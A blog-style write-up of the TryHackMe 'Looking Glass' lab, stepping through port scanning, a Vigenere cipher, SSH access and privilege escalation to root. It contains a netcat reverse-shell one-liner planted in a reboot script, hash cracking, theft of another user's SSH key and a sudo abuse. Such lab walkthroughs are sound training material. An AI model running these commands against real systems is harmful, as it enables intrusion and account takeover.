---
title: "Looking Glass - TryHackMe"
date: "2021-01-10"
categories: 
  - "tryhackme"
coverImage: "Looking-Glass.png"
---

Write-up for tryhackme room [looking glass](https://tryhackme.com/room/lookingglass).

Difficulty Level - Medium

Start with Nmap scan

```
nmap -A -oN allport -p- $IP -T4
```

![](/Images/lookingglass/Screenshot-2021-01-10-181145.png)

As you can see it has a lot ports, apart from OpenSSH (port 22) from port 9000 to port 14000 it have a lot up ports.

when we try to connect to the port we get some message.

![](/Images/lookingglass/Screenshot-2021-01-10-181813.png)

when randomly connecting to port message change from "Lower" to "Higher".

![](/Images/lookingglass/Screenshot-2021-01-10-182208.png)

So I'm guessing we need to connect to right port, we can easily narrow it down to right port. took some time to connect to right port when we connect it give some cipher text and ask for **secret**.

![](/Images/lookingglass/Screenshot-2021-01-10-182801.png)

The correct port is always changing so my port won't work for you. Now we need to decipher the text and find the SECRET. when we look at it we can easily guess it is "**Vigenere Cipher**" we don't have key but there are some online tool to decipher the text.

**[Vigenere Solver](https://www.guballa.de/vigenere-solver)** it help to solve poem, and we get the Secret when we enter the secret we get SSH login credential

![](/Images/lookingglass/Screenshot-2021-01-10-183726.png)

this SSH credential also keep change each time machine reboot.

we log into machine and try to do basic enumeration we can reboot without password, also there is shell script in home directory.

![](/Images/lookingglass/Screenshot-2021-01-10-184641.png)

we can insert reverse shell into script and reboot machine to get shell.you can find reverse shell payloads [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

after you got reverse shell make shell more stabilize

```
python3 -c 'import pty; pty.spawn("/bin/bash")' 

export TERM=xterm
( Press "CTRL + Z" it suspend terminal then enter last command ) 

stty raw -echo; fg
```

In "**/home**" directory we can find another text file name "**humptydumpty.txt**" with contain bunch of hashes you can decrypt using [CrackStation](https://crackstation.net/).

crackstation won't crack the last hash it took long time but finally found out its not hash, we need to convert those from hex to ASCII. you can do it from [CyberChef](https://gchq.github.io/CyberChef/).

We will find the password from the text file name we can guess its password for user **humptydumpty**.

![](/Images/lookingglass/Screenshot-2021-01-10-190608.png)

i tried enumeration for some time but didn't find anything, but we can see alice profile can be execute by anyone so can blindly execute some files, 1st think come to mind is **SSH** key, if you familiar with Linux you can find SSH key in "**/home/alice/.ssh**" .

![](/Images/lookingglass/Screenshot-2021-01-10-191411.png)

now login as Alice.

Do the basic enumeration, we cannot run "**Sudo -l**" because we don't have **alice** password but we can view sudoers manually.

![](/Images/lookingglass/Screenshot-2021-01-10-192304.png)

alice can run mentioned specific word in **/bin/bash** without password so we need to run "sudo -h" for host.

![](/Images/lookingglass/Screenshot-2021-01-10-192722.png)

Finally Root.

Happy Hacking!!!
